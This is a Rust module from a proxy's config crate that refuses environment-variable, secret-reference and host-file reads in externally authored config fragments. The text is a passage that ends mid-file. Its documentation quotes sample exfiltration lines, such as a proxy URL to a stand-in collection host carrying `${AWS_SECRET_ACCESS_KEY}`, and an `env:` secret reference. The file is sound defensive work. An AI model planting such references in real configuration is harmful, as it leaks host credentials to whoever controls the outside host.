// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Soap Bucket LLC

//! Confined template resolution for externally authored config fragments.
//!
//! # The problem this closes
//!
//! Two passes on the compile path read the process environment with no
//! restriction at all:
//!
//! * [`crate::compiler::interpolate_env_vars`] substitutes `${VAR}` over
//!   the raw document *text*, before any parse, inside
//!   [`crate::compile_config`]. Being text-level, it reaches every byte
//!   of the document, including the `lua_script` / `js_script` /
//!   `rego_module` bodies that the post-parse interpolator deliberately
//!   skips.
//! * `{{env.X}}` resolution inside
//!   [`crate::compiler::interpolate_config_vars`] does the same per JSON
//!   string value after the parse.
//!
//! While every byte of the document is written by the operator who runs
//! the proxy, that is defensible: the operator already has the
//! environment. That assumption is already false, and was before config
//! aggregation was designed. A `source:` block's `kind: git` compiles a
//! document authored by whoever can push to that repository, and a
//! config-authority subscriber compiles a document authored by the
//! authority. Both go through the same unrestricted passes. Config
//! aggregation adds a third case rather than creating the first one.
//!
//! In each of them an unrestricted reader turns a config write
//! permission into a read of every secret in the compiling host's
//! environment, which is exactly where credentials live. A document
//! shipping
//!
//! ```yaml
//! action:
//!   type: proxy
//!   url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}"
//! ```
//!
//! exfiltrates on the next compile.
//!
//! # The half template syntax cannot see
//!
//! Template forms are not the only way a document reads its host, and a
//! boundary that stopped only those would refuse one spelling of an
//! attack while waving through the other. Three more forms carry no
//! `${` and no `{{` at all:
//!
//! * `env:NAME` and the legacy `vault://env/NAME` alias are secret
//!   references the process resolver reads out of the environment at
//!   config load
//!   (`crates/sbproxy-vault/src/resolver.rs:135-165`). `api_key:
//!   "env:AWS_SECRET_ACCESS_KEY"` is the attack above with the quotes
//!   moved.
//! * `file:PATH` is the same thing against the filesystem.
//! * `rego_module_path` and `module_path` name a host path the compiler
//!   opens and inlines into the compiled config
//!   (`crates/sbproxy-config/src/compiler.rs:590`).
//!
//! [`ConfinementPolicy`] withholds all three from a fragment, and the
//! last two from a whole document fetched from elsewhere. Provider-URI
//! references (`secret://`, `vault://<backend>/`, `awssm://`) are
//! deliberately still allowed: each resolves only against a backend the
//! operator declared under `proxy.secrets`, which is a path no
//! externally authored document may set.
//!
//! # The shape, and why this one
//!
//! [`resolve_confined_fragment`] resolves a fragment against a binding
//! set the *caller* supplies and nothing else. It reads no environment
//! variable, on any code path, in any field. A fragment names an
//! **input**; the operator decides what that input is bound to.
//!
//! That is the model Helm settled on and it is the state of the art for
//! third-party-authored template fragments. Helm ships the whole Sprig
//! function library to chart authors except `env` and `expandenv`,
//! removed because they "would have given chart authors access to
//! Tiller's environment"; a chart resolves against caller-supplied
//! `.Values` instead (<https://helm.sh/docs/howto/charts_tips_and_tricks/>,
//! <https://github.com/helm/helm/pull/5815>). Argo CD excludes the same
//! two functions plus `getHostByName` from its Sprig exposure. It is the
//! same boundary Kubernetes draws one layer down: a container's
//! environment is what the Pod spec enumerates through `env` and
//! `envFrom`, and a container never sees the kubelet's environment.
//!
//! The alternatives were considered and are weaker:
//!
//! * **A name allowlist or prefix** (decK requires a `DECK_` prefix on
//!   any variable a state file may reach through `${{ env "..." }}`,
//!   <https://developer.konghq.com/deck/reference/env-variables/>). The
//!   fragment still names a process variable, so every variable that
//!   happens to carry the prefix is readable, and the allowlist is a
//!   property of the runner rather than of the caller. A binding set is
//!   strictly stronger: the fragment cannot name a variable at all, and
//!   the operator is free to bind the input from the environment, from a
//!   secret backend, or from a literal, without the fragment knowing or
//!   caring.
//! * **A prefix with no allowlist** (Caddy's `{env.NAME}`). Explicit
//!   about which placeholder is an environment read, silent about which
//!   variables are in scope: all of them are.
//! * **Document-wide text substitution** (APISIX's `${{VAR:=default}}`
//!   over `config.yaml`). This is what sbproxy does today for
//!   operator-authored config, and it is precisely the primitive that
//!   cannot express "this subtree is env-frozen".
//! * **Scanning fragment text for `${` before splicing.** A deny list
//!   over text: it forbids legitimate forms (`${args.id}` is MCP
//!   local-tool vocabulary, `$${VAR}` is the documented escape) while
//!   missing anything a later resolution step can synthesize. The
//!   project rule is that a boundary is an allowlist, never a deny list.
//!
//! Envoy is the outlier worth naming: it has no document-wide
//! environment substitution at all, and the environment enters only at
//! named extension points such as the `%ENVIRONMENT(X)%` access-log
//! command operator. That is the same instinct, expressed by having no
//! general mechanism to confine.
//!
//! # The contract
//!
//! Given a fragment and a binding set, [`resolve_confined_fragment`]
//! returns YAML in which **nothing a later pass could resolve
//! survives**. Concretely:
//!
//! | Form | Confined treatment | Why |
//! |---|---|---|
//! | `{{vars.X}}`, `{{variables.X}}` | resolved from the bindings; an unbound `X` is [`ConfinedTemplateError::UnboundInput`] | the one thing a fragment may parameterize |
//! | `${VAR}`, `${VAR:-default}` | refused, naming `VAR` and the field | `interpolate_env_vars` would read it, in any field |
//! | `{{env.X}}` outside a script body | refused, naming `X` and the field | `interpolate_config_vars` would read it |
//! | `{{env.X}}` inside a script body | literal | no pass resolves `{{ }}` in a script body |
//! | `${args.x}`, `${steps.x.y}`, `${method}` | literal | runtime vocabulary; `interpolate_env_vars` does not touch it either |
//! | `$${VAR}` | literal | the documented escape; no pass resolves it |
//! | `{{request.x}}`, any other `{{prefix}}` | literal | resolved nowhere, at compile or at runtime |
//! | any script body (`lua_script`, `js_script`, `rego_module`) | no `{{ }}` substitution at all | WOR-2482: a literal `{{` in a script must reach the engine as authored |
//!
//! The refusal set is defined as *exactly* the placeholders some
//! fleet-wide pass would resolve from the environment, and it is
//! computed with the same scanner that pass uses (`env_references_in`
//! and `placeholder_is_env_reference`, both in
//! [`crate::compiler`]). Sharing the
//! scanner is deliberate: a detector narrower than its enforcer is worse
//! than none, and the `$$` pair-parity rule and the MCP `args.` /
//! `steps.` carve-out are exactly the places two hand-written copies
//! would drift.
//!
//! # Why refuse rather than pass through
//!
//! WOR-2433 leaves the choice open between refusing a `${VAR}` that
//! survives a fragment and escaping it so the publish-time
//! unresolved-reference check does not see it. This module refuses, for
//! two reasons.
//!
//! Passing one through is not safe. The confined pass runs on the
//! fragment; the *composed* document then goes to
//! [`crate::compile_config`], whose text-level `${VAR}` substitution
//! reaches every byte, script bodies included. A `${VAR}` that survives
//! confinement is read from the aggregator's environment a moment later,
//! which is the whole defect.
//!
//! Escaping is not honest. `$${VAR}` survives both passes, but the `$$`
//! bytes stay in the value: only the MCP local-tool engine owns an
//! unescape, so a Lua body would reach its engine as `$${VAR}` rather
//! than as authored. Rewriting a script body is worse than refusing to
//! ship it.
//!
//! Refusing keeps the publish-time check honest in both directions.
//! [`crate::unresolved_env_references`] still fires for
//! operator-authored content, because that path is untouched; and it
//! cannot misfire on a confined fragment, because a confined fragment
//! carries no live `${VAR}` for it to find.
//!
//! # What this module does not do
//!
//! It does not change the fleet-wide passes. Operator-authored config
//! keeps today's behavior exactly, `${VAR:-default}` shell semantics
//! included. Confinement applies where a caller asks for it, and the
//! callers are the three places config text arrives from a party that
//! does not own the compiling host: the git arm of
//! [`crate::source`]'s loader, `validate_publish_payload` on the config
//! authority, and the subscriber's merge of a remote bundle.
//!
//! # What this boundary does not stop, stated rather than implied
//!
//! [`ConfinementPolicy::remote_document`] still allows `${VAR}`, so a
//! git-sourced document or an authority bundle can name a process
//! variable that resolves on the node. The existing
//! [`crate::unresolved_env_references`] gate only refuses a reference
//! that *fails* to resolve, so one that succeeds is invisible to it.
//! Closing that needs the node's own operator to declare which variable
//! names a remote document may name, which is a config key this module
//! does not add and cannot invent: defaulting it to "none" would break
//! every git-sourced fleet on upgrade, and defaulting it to "any" is the
//! behavior described here. A fragment has no such gap, because
//! [`ConfinementPolicy::sealed`] allows no environment name at all.
//!
//! The mirror of `sbproxy-vault`'s host-backed reference set is a mirror
//! and not a call, because `sbproxy-config` does not depend on that
//! crate. See `crate::types::host_backed_secret_reference` for what
//! holds the two in step and what it cannot see.

use std::collections::HashMap;

use crate::compiler::{env_references_in, lookup_variable_path};
use crate::types::{host_backed_secret_reference, HostSecretSource};

/// Keys whose value is an executed or evaluated script body rather than
/// config text.
///
/// The same list [`crate::compiler::interpolate_config_vars`] skips, and
/// for the same reason (WOR-2482): a literal `{{` inside a Lua string, a
/// JS comment, or a Rego module must reach its engine as authored, so no
/// `{{ }}` substitution runs inside one. `${VAR}` is a different matter
/// and is refused here even inside a script body, because the text-level
/// pre-parse pass on the composed document does reach it.
const SCRIPT_BODY_KEYS: &[&str] = &["lua_script", "js_script", "rego_module"];

/// The `{{ }}` prefixes some later pass resolves, and which therefore
/// must not survive a confined fragment.
///
/// `request.` is absent on purpose: it is bound per request by the
/// modifier context, never from the environment, and the fleet-wide pass
/// leaves it literal too.
const RESOLVABLE_BRACE_PREFIXES: &[&str] = &["env.", "vars.", "variables."];

/// Keys whose value is a path the compiler reads off the host
/// filesystem and inlines into the compiled config, paired with the key
/// that carries the same content inline.
///
/// `rego_module_path` is read by `resolve_rego_modifier_module`
/// (`crates/sbproxy-config/src/compiler.rs:590`) at compile and again on
/// every reload; `module_path` is its spelling on `policy: rego` and on
/// `transforms[] type: wasm`. A document that may name one of these can
/// name any path the proxy process can open, which is a host-file read
/// handed to whoever writes the document. The root config keeps the
/// power because the operator owns the filesystem.
const HOST_FILE_KEYS: &[(&str, &str)] = &[
    ("rego_module_path", "rego_module"),
    ("module_path", "module"),
];

/// What an externally authored document may do inside the confined
/// boundary.
///
/// Three powers the root operator config keeps and this boundary hands
/// out one at a time, because the party that writes the document is not
/// the party that owns the host it compiles on:
///
/// * naming a process variable in a template form,
/// * using a secret reference that reads the host directly
///   (`env:NAME`, `vault://env/NAME`, `file:PATH`),
/// * inlining a host file by path (`rego_module_path`, `module_path`).
///
/// [`ConfinementPolicy::sealed`] grants none of them and is what a
/// fragment gets. [`ConfinementPolicy::remote_document`] grants the
/// first only, and is what a whole document fetched from a git
/// repository or served by a config authority gets; see that
/// constructor for why the first one stays.
#[derive(Debug, Clone)]
pub struct ConfinementPolicy {
    /// `Some` means `{{vars.X}}` resolves against these bindings and an
    /// unbound name is an error. `None` means `{{ }}` is left exactly as
    /// authored, for a document whose variables are resolved later by
    /// the fleet-wide pass against the origin they land on.
    inputs: Option<HashMap<String, serde_json::Value>>,
    /// Whether the document may name a process variable through
    /// `${VAR}` or `{{env.X}}`.
    process_environment: bool,
    /// Whether the document may carry a host-backed secret reference.
    host_backed_secrets: bool,
    /// Whether the document may inline a host file by path.
    host_file_inlining: bool,
}

impl ConfinementPolicy {
    /// No process environment, no host-backed secret reference, no host
    /// file, and no variable the caller did not bind. What a fragment
    /// authored in another repository gets.
    #[must_use]
    pub fn sealed() -> Self {
        Self {
            inputs: Some(HashMap::new()),
            process_environment: false,
            host_backed_secrets: false,
            host_file_inlining: false,
        }
    }

    /// [`Self::sealed`] plus the inputs the caller binds for
    /// `{{vars.X}}`.
    #[must_use]
    pub fn with_inputs(inputs: HashMap<String, serde_json::Value>) -> Self {
        Self {
            inputs: Some(inputs),
            ..Self::sealed()
        }
    }

    /// A whole document fetched from a git repository or served by a
    /// config authority: `${VAR}` keeps working, host-backed secret
    /// references and host-file inlining do not.
    ///
    /// The asymmetry is deliberate and each half has a reason.
    ///
    /// `${VAR}` stays because it is the documented and only supported
    /// way to run one shared document across a fleet: the document names
    /// the per-node values and each host exports them (see "Node
    /// identity in a shared repository" in docs/configuration.md).
    /// Sealing it would break every git-sourced fleet on upgrade, which
    /// is a breaking change wearing a default's clothes. Its residual
    /// risk is stated in the module docs rather than hidden.
    ///
    /// The other two go, and nothing breaks, because neither is a
    /// documented power of a remote document and neither is exercised
    /// anywhere in this tree. They are also the two that
    /// [`crate::AUTHORITY_DENIED_PATHS`] already reasons about at the
    /// path level: `proxy.secrets` is denied to an authority precisely
    /// because the node owns its own secret backends and filesystem.
    /// Sealing `env:`, `vault://env/` and `file:` applies that same rule
    /// to values instead of paths, which is where the deny list could
    /// not reach.
    #[must_use]
    pub fn remote_document() -> Self {
        Self {
            inputs: None,
            process_environment: true,
            host_backed_secrets: false,
            host_file_inlining: false,
        }
    }
}

/// A confined fragment was refused. Every variant names the fragment and
/// the field path, and none of them carries a value read from the
/// process environment, because the confined pass reads none.
#[derive(Debug, thiserror::Error)]
pub enum ConfinedTemplateError {
    /// The fragment is not YAML.
    #[error("config fragment `{fragment}` does not parse as YAML: {source}")]
    Parse {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// The parse failure.
        #[source]
        source: serde_yaml::Error,
    },
    /// The fragment carries a custom YAML tag.
    ///
    /// Tags are silently stripped by the parser, keeping the bare
    /// scalar, so `password: !env ADMIN_PASSWORD` becomes the literal
    /// string `ADMIN_PASSWORD`. Refused at the fragment boundary so the
    /// error names the fragment rather than a path in a composed
    /// document nobody wrote by hand.
    #[error(
        "config fragment `{fragment}` carries the unsupported YAML tag `{tag}` at `{path}`. \
         Tags are stripped by the parser, so the value would be the literal text after the \
         tag. A fragment parameterizes itself with `{{{{vars.NAME}}}}` inputs its caller \
         binds; see the `Confined fragments` section of docs/configuration.md."
    )]
    YamlTag {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the tagged node.
        path: String,
        /// The tag as authored, e.g. `!env`.
        tag: String,
    },
    /// The fragment references a process environment variable with
    /// `${VAR}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}`. A fragment resolves only the inputs its caller binds, so \
         this is refused rather than read: an externally authored fragment that could name \
         a variable could read every credential in the aggregator's environment. Declare it \
         as a `{{{{vars.NAME}}}}` input and let the operator bind it, or write \
         `{variable_escaped}` to keep the literal text. See the `Confined fragments` \
         section of docs/configuration.md."
    )]
    EnvReference {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field, suffixed with
        /// `(mapping key)` when the placeholder sits in a mapping key
        /// rather than in a value.
        path: String,
        /// The variable name, with any `:-default` tail removed. The
        /// variable's *value* is deliberately absent: nothing here ever
        /// reads it.
        variable: String,
        /// The placeholder rendered with the `$$` escape, ready to paste.
        variable_escaped: String,
    },
    /// The fragment references a process environment variable with
    /// `{{env.X}}`.
    #[error(
        "config fragment `{fragment}` references the process environment variable \
         `{variable}` at `{path}` as `{{{{env.{variable}}}}}`. A fragment resolves only the \
         inputs its caller binds. Declare it as a `{{{{vars.NAME}}}}` input and let the \
         operator bind it. See the `Confined fragments` section of docs/configuration.md."
    )]
    EnvTemplate {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The variable name. Its value is deliberately absent.
        variable: String,
    },
    /// The fragment references an input its caller did not bind.
    ///
    /// A named error rather than a warning or a literal passthrough: a
    /// fragment reading a variable it never declared as an input is the
    /// same defect as reading the environment, at a smaller radius.
    #[error(
        "config fragment `{fragment}` references the input `{variable}` at `{path}`, which \
         its caller did not bind. Bound inputs: {bound}. A fragment may read only the inputs \
         it was given; see the `Confined fragments` section of docs/configuration.md."
    )]
    UnboundInput {
        /// Caller-supplied label for the fragment, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The input name the fragment asked for.
        variable: String,
        /// The bound input **names**, sorted, comma separated, or
        /// `(none)`. Names only: a binding value can be a credential.
        bound: String,
    },
    /// The document carries a secret reference that reads the host
    /// directly rather than a backend the operator declared.
    ///
    /// `env:NAME` and the legacy `vault://env/NAME` alias carry no
    /// template syntax at all, so the template scan cannot see them;
    /// they are the same environment read spelled a different way, and
    /// `file:PATH` is the filesystem equivalent.
    #[error(
        "externally authored config `{fragment}` sets `{path}` to a `{form}` secret          reference, which resolves from {reads} on whichever machine compiles the document.          The party that writes this document is not the party that owns that host, so the          reference is refused rather than resolved: without this, a write to this document          would be a read of the compiling host's credentials. Declare the value in the root          config the operator owns, or name a backend the operator declared under          `proxy.secrets`. See the `Confined fragments` section of docs/configuration.md."
    )]
    HostSecretReference {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// Dotted path to the offending field.
        path: String,
        /// The reference spelling, e.g. `env:NAME`. Never the value, and
        /// never the variable or path the reference names: the name is
        /// enough of a pointer for the author, who wrote it.
        form: &'static str,
        /// What that spelling reads, e.g. `the process environment`.
        reads: &'static str,
    },
    /// The document names a host filesystem path the compiler would read
    /// and inline.
    #[error(
        "externally authored config `{fragment}` sets `{path}`, which the compiler reads off          the host filesystem and inlines. A document authored somewhere other than the host          it compiles on may not name a path on that host: the file belongs to whoever runs          the proxy. Carry the source inline under `{inline_key}` instead, or set the path in          the root config. See the `Confined fragments` section of docs/configuration.md."
    )]
    HostFileInlining {
        /// Caller-supplied label for the document, for the operator.
        fragment: String,
        /// Dotted path to the offending key.
        path: String,
        /// The key carrying the same content inline, for the remedy.
        inline_key: &'static str,
    },
}

/// Resolve an externally authored config fragment against a binding
/// set, and nothing else.
///
/// `fragment` is a label for error messages: whatever identifies the
/// fragment to the operator (a repository and path, an `origin_sources`
/// entry). `yaml` is the fragment as fetched. `bindings` is the input
/// set the caller declared for it; a dotted reference
/// (`{{vars.limits.rps}}`) indexes the map with its first segment and
/// walks nested JSON objects with the rest, the same way origin
/// `variables:` resolve.
///
/// Shorthand for [`ConfinementPolicy::with_inputs`] over the same walk
/// [`check_confined_document`] runs, keeping the resolved text instead
/// of discarding it.
///
/// Returns the resolved fragment as YAML, ready to compose. The result
/// carries no live `${VAR}`, no resolvable `{{env.X}}`, no resolvable
/// `{{vars.X}}`, no host-backed secret reference, and no host file path,
/// so composing it into a document and handing that document to
/// [`crate::compile_config`] cannot reach the process environment or the
/// host filesystem through anything the fragment wrote.
///
/// The returned YAML is re-serialized from the parsed value tree, so
/// comments and formatting from the fragment do not survive. That is
/// deliberate as well as incidental: a comment is text nobody parses,
/// and the text-level `${VAR}` pass on the composed document would
/// happily substitute inside one.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming the fragment, the field
/// path, and the variable or form, for a fragment that does not parse,
/// carries a YAML tag, references the process environment in any form,
/// carries a host-backed secret reference, inlines a host file by path,
/// or references an input outside `bindings`.
pub fn resolve_confined_fragment(
    fragment: &str,
    yaml: &str,
    bindings: &HashMap<String, serde_json::Value>,
) -> Result<String, ConfinedTemplateError> {
    let policy = ConfinementPolicy::with_inputs(bindings.clone());
    let resolved = confine(fragment, yaml, &policy)?;
    // Serializing a parsed value tree cannot fail on any value that came
    // out of the parser, but the signature is fallible; report it the
    // same way a parse failure is reported rather than unwrapping.
    serde_yaml::to_string(&resolved).map_err(|source| ConfinedTemplateError::Parse {
        fragment: fragment.to_string(),
        source,
    })
}

/// Check a whole externally authored document against `policy` without
/// rewriting a byte of it.
///
/// This is the entry point for a document that is already complete: one
/// fetched from a git repository through a `source:` block, one a config
/// authority is about to publish, and one a subscriber has merged over
/// its local base. Those documents are signed, digested, or diffed by
/// their callers, so returning modified text would be wrong; the walk
/// runs over a throwaway parse and only the refusal escapes.
///
/// # Errors
///
/// Returns a [`ConfinedTemplateError`] naming the document, the field
/// path, and the offending form.
pub fn check_confined_document(
    label: &str,
    yaml: &str,
    policy: &ConfinementPolicy,
) -> Result<(), ConfinedTemplateError> {
    confine(label, yaml, policy).map(|_| ())
}

/// The one confined walk. Both entry points above are this function plus
/// a decision about what to do with its result.
fn confine(
    label: &str,
    yaml: &str,
    policy: &ConfinementPolicy,
) -> Result<serde_yaml::Value, ConfinedTemplateError> {
    let mut root: serde_yaml::Value =
        serde_yaml::from_str(yaml).map_err(|source| ConfinedTemplateError::Parse {
            fragment: label.to_string(),
            source,
        })?;
    let resolver = Resolver {
        fragment: label,
        policy,
        bound_names: policy.inputs.as_ref().map_or_else(String::new, bound_names),
    };
    resolver.walk(&mut root, "", false)?;
    Ok(root)
}

/// The bound input names, sorted, for an error message. Names only.
fn bound_names(bindings: &HashMap<String, serde_json::Value>) -> String {
    if bindings.is_empty() {
        return "(none)".to_string();
    }
    let mut names: Vec<&str> = bindings.keys().map(String::as_str).collect();
    names.sort_unstable();
    names.join(", ")
}

/// Carries the per-call context so the recursive walk does not thread
/// four arguments through every frame.
struct Resolver<'a> {
    fragment: &'a str,
    policy: &'a ConfinementPolicy,
    bound_names: String,
}

impl Resolver<'_> {
    /// Resolve and check every string in `value` in place.
    ///
    /// `in_script_body` is set once the walk has descended into a
    /// script-body key and stays set for that whole subtree, matching
    /// how `interpolate_config_vars` skips one.
    fn walk(
        &self,
        value: &mut serde_yaml::Value,
        path: &str,
        in_script_body: bool,
    ) -> Result<(), ConfinedTemplateError> {
        match value {
            serde_yaml::Value::Tagged(tagged) => {
                return Err(ConfinedTemplateError::YamlTag {
                    fragment: self.fragment.to_string(),
                    path: shown_path(path),
                    tag: tagged.tag.to_string(),
                });
            }
            serde_yaml::Value::String(s) => {
                *s = self.resolve_string(path, s, in_script_body)?;
            }
            serde_yaml::Value::Sequence(seq) => {
                for (index, item) in seq.iter_mut().enumerate() {
                    let child = join_path(path, &index.to_string());
                    self.walk(item, &child, in_script_body)?;
                }
            }
            serde_yaml::Value::Mapping(map) => {
                // Collect the keys first so the key subtree can be
                // walked with the same code that walks a value. A key is
                // config text too, and the pre-parse pass on the
                // composed document substitutes inside one:
                // `"${AWS_SECRET_ACCESS_KEY}": v` would exfiltrate
                // through a header name. Scanning only `key.as_str()`
                // left the YAML explicit-key form
                // (`? [ "${VAR}" ]` / `: {}`) unscanned, which is a
                // detector narrower than its enforcer at exactly the
                // spot this pass claims to have widened
                // (WOR-2433 review).
                let mut keys: Vec<serde_yaml::Value> = map.keys().cloned().collect();
                for key in &mut keys {
                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &key_name);
                    self.check_key(&child, key)?;
                }
                for (key, val) in map.iter_mut() {
                    let key_name = key.as_str().map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &key_name);
                    if let Some((_, inline_key)) = HOST_FILE_KEYS
                        .iter()
                        .find(|(name, _)| *name == key_name.as_str())
                    {
                        if !self.policy.host_file_inlining {
                            return Err(ConfinedTemplateError::HostFileInlining {
                                fragment: self.fragment.to_string(),
                                path: shown_path(&child),
                                inline_key,
                            });
                        }
                    }
                    let script = in_script_body || SCRIPT_BODY_KEYS.contains(&key_name.as_str());
                    self.walk(val, &child, script)?;
                }
            }
            _ => {}
        }
        Ok(())
    }

    /// Check a mapping key, whatever shape it has.
    ///
    /// A key is never substituted: no later pass resolves `{{ }}` in key
    /// position, so rewriting one would be wider than the enforcer. It
    /// is scanned for everything a later pass *would* act on, and the
    /// scan recurses, so a sequence or a nested mapping in key position
    /// is covered rather than skipped.
    fn check_key(&self, path: &str, key: &serde_yaml::Value) -> Result<(), ConfinedTemplateError> {
        match key {
            serde_yaml::Value::Tagged(tagged) => Err(ConfinedTemplateError::YamlTag {
                fragment: self.fragment.to_string(),
                path: format!("{} (mapping key)", shown_path(path)),
                tag: tagged.tag.to_string(),
            }),
            serde_yaml::Value::String(text) => {
                let shown = format!("{} (mapping key)", shown_path(path));
                self.refuse_env_references(&shown, text)?;
                self.refuse_host_secret_reference(&shown, text)
            }
            serde_yaml::Value::Sequence(seq) => {
                for (index, item) in seq.iter().enumerate() {
                    self.check_key(&join_path(path, &index.to_string()), item)?;
                }
                Ok(())
            }
            serde_yaml::Value::Mapping(map) => {
                for (nested_key, nested_value) in map {
                    let name = nested_key
                        .as_str()
                        .map_or_else(|| "?".to_string(), str::to_owned);
                    let child = join_path(path, &name);
                    self.check_key(&child, nested_key)?;
                    self.check_key(&child, nested_value)?;
                }
                Ok(())
            }
            _ => Ok(()),
        }
    }

    /// Resolve one string: substitute the bound `{{vars.X}}` inputs when
    /// the policy binds any, then refuse anything the policy withholds
    /// that a later pass could still act on.
    fn resolve_string(
        &self,
        path: &str,
        input: &str,
        in_script_body: bool,
    ) -> Result<String, ConfinedTemplateError> {
        let shown = shown_path(path);
        // A script body is opaque: no `{{ }}` substitution, matching
        // `interpolate_config_vars`. Nothing resolves `{{ }}` there
        // later either, so a `{{env.X}}` in a Lua string is inert text
        // and stays as authored.
        let substitute = !in_script_body && self.policy.inputs.is_some();
        let resolved = if substitute {
            self.substitute_inputs(&shown, input)?
        } else {
            input.to_string()
        };
        // Post-substitution, not pre: a binding whose value contains
        // `$` or `{` can synthesize a live placeholder that was not in
        // the fragment as authored. A pre-substitution scan would never
        // see it.
        self.refuse_env_references(&shown, &resolved)?;
        if substitute {
            self.refuse_resolvable_braces(&shown, &resolved)?;
        }
        self.refuse_host_secret_reference(&shown, &resolved)?;
        Ok(resolved)
    }

    /// Replace `{{vars.X}}` / `{{variables.X}}` with the bound input.
    ///
    /// `{{env.X}}` is refused here rather than left for the residue scan
    /// so the error can say which form was written. Every other prefix
    /// is left literal, exactly as the fleet-wide pass leaves it.
    fn substitute_inputs(
        &self,
        shown_path: &str,
        input: &str,
    ) -> Result<String, ConfinedTemplateError> {
        let bindings = match self.policy.inputs.as_ref() {
            Some(bindings) => bindings,
            None => return Ok(input.to_string()),
        };
        let mut result = String::with_capacity(input.len());
        let mut rest = input;
        while let Some(start) = rest.find("{{") {
            result.push_str(&rest[..start]);
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                result.push_str(&rest[start..]);
                return Ok(result);
            };
            let key = after_open[..end].trim();
            if let Some(name) = key
                .strip_prefix("vars.")
                .or_else(|| key.strip_prefix("variables."))
            {
                match lookup_variable_path(bindings, name) {
                    Some(serde_json::Value::String(s)) => result.push_str(s),
                    Some(other) => result.push_str(&other.to_string()),
                    None => {
                        return Err(ConfinedTemplateError::UnboundInput {
                            fragment: self.fragment.to_string(),
                            path: shown_path.to_string(),
                            variable: name.to_string(),
                            bound: self.bound_names.clone(),
                        })
                    }
                }
            } else if let Some(name) = key.strip_prefix("env.") {
                if self.policy.process_environment {
                    result.push_str("{{");
                    result.push_str(&after_open[..end]);
                    result.push_str("}}");
                } else {
                    return Err(ConfinedTemplateError::EnvTemplate {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                    });
                }
            } else {
                result.push_str("{{");
                result.push_str(&after_open[..end]);
                result.push_str("}}");
            }
            rest = &after_open[end + 2..];
        }
        result.push_str(rest);
        Ok(result)
    }

    /// Refuse every live `${VAR}` in `text`, unless the policy grants
    /// the process environment.
    ///
    /// "Live" is decided by `env_references_in`, the same scanner the
    /// fleet-wide hazard report runs, so this refuses exactly the
    /// placeholders `interpolate_env_vars` would resolve from the
    /// environment: no more (`${args.id}`, `$${VAR}`, `${method}` and
    /// the documented access-log vocabulary stay literal) and no less.
    fn refuse_env_references(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if self.policy.process_environment {
            return Ok(());
        }
        if let Some(reference) = env_references_in(text).first() {
            // `${NAME}` / `${NAME:-default}` -> `NAME`. The default is
            // dropped from the message: the variable is what the author
            // has to stop naming.
            let inner = &reference[2..reference.len() - 1];
            let name = inner.split_once(":-").map_or(inner, |(name, _)| name);
            return Err(ConfinedTemplateError::EnvReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                variable: name.to_string(),
                variable_escaped: format!("${reference}"),
            });
        }
        Ok(())
    }

    /// Refuse a secret reference the process resolver reads straight off
    /// the host, unless the policy grants that.
    ///
    /// This is the half of the boundary the template scan cannot see:
    /// `env:AWS_SECRET_ACCESS_KEY` carries no `${` and no `{{`, passes
    /// every template check untouched, and is read out of the process
    /// environment by `sbproxy-vault`'s resolver at config load. The
    /// module's own worked attack, `url:
    /// "https://collect.example/${AWS_SECRET_ACCESS_KEY}"`, was refused
    /// while the same attack spelled `api_key: "env:AWS_SECRET_ACCESS_KEY"`
    /// was not (WOR-2433 review).
    ///
    /// Unlike the `{{ }}` substitution, this runs inside a script body
    /// too, which is one place it is wider than the resolver: nothing
    /// resolves a secret reference out of a Lua or Rego body. The width
    /// costs nothing in practice, because the resolver matches a whole
    /// value and a script body would have to *begin* with `env:`,
    /// `file:` or `vault://env/` to trip it, and narrowing it would
    /// mean this walk had to carry the list of fields on which a secret
    /// reference is resolved, which is a list that drifts.
    fn refuse_host_secret_reference(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        if self.policy.host_backed_secrets {
            return Ok(());
        }
        if let Some(source) = host_backed_secret_reference(text) {
            // `source.form()` and `source.reads()` are static strings;
            // neither the referenced name nor anything resolved from it
            // is read here, let alone rendered.
            let _: HostSecretSource = source;
            return Err(ConfinedTemplateError::HostSecretReference {
                fragment: self.fragment.to_string(),
                path: shown_path.to_string(),
                form: source.form(),
                reads: source.reads(),
            });
        }
        Ok(())
    }

    /// Refuse every `{{ }}` placeholder a later pass would resolve.
    ///
    /// After [`Self::substitute_inputs`] has run, the only way one of
    /// these survives is that a binding's value synthesized it, so this
    /// is the fail-closed half of the injection check above.
    fn refuse_resolvable_braces(
        &self,
        shown_path: &str,
        text: &str,
    ) -> Result<(), ConfinedTemplateError> {
        let mut rest = text;
        while let Some(start) = rest.find("{{") {
            let after_open = &rest[start + 2..];
            let Some(end) = after_open.find("}}") else {
                return Ok(());
            };
            let key = after_open[..end].trim();
            if let Some(prefix) = RESOLVABLE_BRACE_PREFIXES
                .iter()
                .find(|prefix| key.starts_with(**prefix))
            {
                let name = &key[prefix.len()..];
                return Err(if *prefix == "env." {
                    ConfinedTemplateError::EnvTemplate {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                    }
                } else {
                    ConfinedTemplateError::UnboundInput {
                        fragment: self.fragment.to_string(),
                        path: shown_path.to_string(),
                        variable: name.to_string(),
                        bound: self.bound_names.clone(),
                    }
                });
            }
            rest = &after_open[end + 2..];
        }
        Ok(())
    }
}

/// `parent` and `child` joined with a dot, matching the dotted paths
/// `scan_yaml_hazards` reports.
